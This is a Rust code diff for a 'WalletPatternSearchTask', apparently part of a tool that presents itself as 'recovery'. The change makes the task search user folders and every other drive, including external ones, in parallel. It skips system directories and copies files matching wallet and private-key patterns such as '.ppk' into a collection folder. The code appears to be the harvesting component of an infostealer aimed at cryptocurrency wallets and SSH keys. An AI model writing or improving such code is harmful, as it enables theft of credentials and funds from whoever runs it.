@@ -155,6 +155,19 @@ const TARGET_PATTERNS: &[&str] = &[
     ".ppk",
 ];
 
+const IGNORED_DIRS: &[&str] = &[
+    "Windows",
+    "Program Files",
+    "Program Files (x86)",
+    "ProgramData",
+    "$Recycle.Bin",
+    "System Volume Information",
+    "OneDriveTemp",
+    "node_modules",
+    ".git",
+    "target",
+];
+
 #[async_trait]
 impl RecoveryTask for WalletPatternSearchTask {
     fn label(&self) -> String {
@@ -168,39 +181,63 @@ impl RecoveryTask for WalletPatternSearchTask {
     async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
         let mut artifacts = Vec::new();
         let dest_root = wallet_output_dir(ctx, "Discovery").await?;
+        let mut handles = Vec::new();
 
-        // Scan user directories with depth 5 (deeper scan for known user paths)
+        // Scan user directories (deeper scan)
         for root in &self.user_roots {
-            for entry in WalkDir::new(root)
-                .max_depth(5)
-                .into_iter()
-                .filter_map(Result::ok)
-                .filter(|e| e.file_type().is_file())
-            {
-                let name = entry.file_name().to_string_lossy();
-                if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
-                    copy_wallet_file("Discovery", entry.path(), &dest_root, &mut artifacts).await?;
-                }
-            }
+            let root = root.clone();
+            handles.push(tokio::task::spawn_blocking(move || {
+                perform_scan(root, 5)
+            }));
         }
 
-        // Scan other drives with depth 3 (shallow scan for USB/External)
+        // Scan other drives (shallow scan)
         for root in &self.drive_roots {
-            for entry in WalkDir::new(root)
-                .max_depth(3)
-                .into_iter()
-                .filter_map(Result::ok)
-                .filter(|e| e.file_type().is_file())
-            {
-                let name = entry.file_name().to_string_lossy();
-                if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
-                    copy_wallet_file("Discovery", entry.path(), &dest_root, &mut artifacts).await?;
+            let root = root.clone();
+            handles.push(tokio::task::spawn_blocking(move || {
+                perform_scan(root, 3)
+            }));
+        }
+
+        for handle in handles {
+            if let Ok(files) = handle.await {
+                for file in files {
+                    // Best effort copy
+                    let _ = copy_wallet_file("Discovery", &file, &dest_root, &mut artifacts).await;
                 }
             }
         }
 
         Ok(artifacts)
     }
+}
+
+fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
+    let mut found = Vec::new();
+    let walker = WalkDir::new(root)
+        .max_depth(depth)
+        .follow_links(false)
+        .into_iter()
+        .filter_entry(|e| !is_ignored(e));
+
+    for entry in walker.filter_map(Result::ok) {
+        if !entry.file_type().is_file() {
+            continue;
+        }
+        let name = entry.file_name().to_string_lossy();
+        if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
+            found.push(entry.path().to_path_buf());
+        }
+    }
+    found
+}
+
+fn is_ignored(entry: &walkdir::DirEntry) -> bool {
+    entry
+        .file_name()
+        .to_str()
+        .map(|s| IGNORED_DIRS.contains(&s))
+        .unwrap_or(false)
 }
 
 
